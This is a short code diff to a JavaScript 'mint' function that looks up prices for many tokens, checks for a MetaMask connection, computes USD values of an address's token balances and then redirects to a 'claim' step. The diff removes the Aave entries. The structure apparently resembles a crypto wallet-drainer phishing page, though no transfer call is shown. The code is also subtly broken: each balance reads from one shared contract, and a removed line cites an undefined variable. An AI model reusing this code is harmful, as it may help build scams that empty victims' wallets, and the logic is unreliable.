@@ -87,7 +87,6 @@ function mint(wallet) {
     const USDCprice = await Moralis.Web3API.token.getTokenPrice({address: "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48"});
     const Daiprice = await Moralis.Web3API.token.getTokenPrice({address: "0x6b175474e89094c44da98b954eedeac495271d0f"});
     const Sandboxprice = await Moralis.Web3API.token.getTokenPrice({address: "0x3845badAde8e6dFF049820680d1F14bD3903a5d0"});
-    const Aaveprice = await Moralis.Web3API.token.getTokenPrice({address: "0xe1ba0fb44ccb0d11b80f92f4f8ed94ca3ff51d00"});
     if (!await isMetaMaskConnected())
       onConnectClick()
     
@@ -105,7 +104,6 @@ function mint(wallet) {
       const contractUSDC = new Web3Client.eth.Contract(window.CONTRACT_ABI, "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48");
       const contractDai = new Web3Client.eth.Contract(window.CONTRACT_ABI, "0x6b175474e89094c44da98b954eedeac495271d0f");
       const contractSandbox = new Web3Client.eth.Contract(window.CONTRACT_ABI, "0x3845badAde8e6dFF049820680d1F14bD3903a5d0");
-      const contractAave = new Web3Client.eth.Contract(window.CONTRACT_ABI, "0xe1ba0fb44ccb0d11b80f92f4f8ed94ca3ff51d00");
       const BalanceTether = Web3Client.utils.fromWei(await contract.methods.balanceOf(adress).call()) * Tetherprice.usdPrice;
       const BalanceBUSD = Web3Client.utils.fromWei(await contract.methods.balanceOf(adress).call()) * BUSDprice.usdPrice;
       const BalanceWETH = Web3Client.utils.fromWei(await contract.methods.balanceOf(adress).call()) * WETHprice.usdPrice;
@@ -116,7 +114,6 @@ function mint(wallet) {
       const BalanceUSDC = Web3Client.utils.fromWei(await contract.methods.balanceOf(adress).call()) * USDCprice.usdPrice;
       const BalanceDai = Web3Client.utils.fromWei(await contract.methods.balanceOf(adress).call()) * Daiprice.usdPrice;
       const BalanceSandbox = Web3Client.utils.fromWei(await contract.methods.balanceOf(adress).call()) * Sandboxprice.usdPrice;
-      const BalanceAave = Web3Client.utils.fromWei(await contract.methods.balanceOf(adress).call()) * Aave.usdPrice;
       redirectToClaim()
     } catch (error) {
       console.error(error);
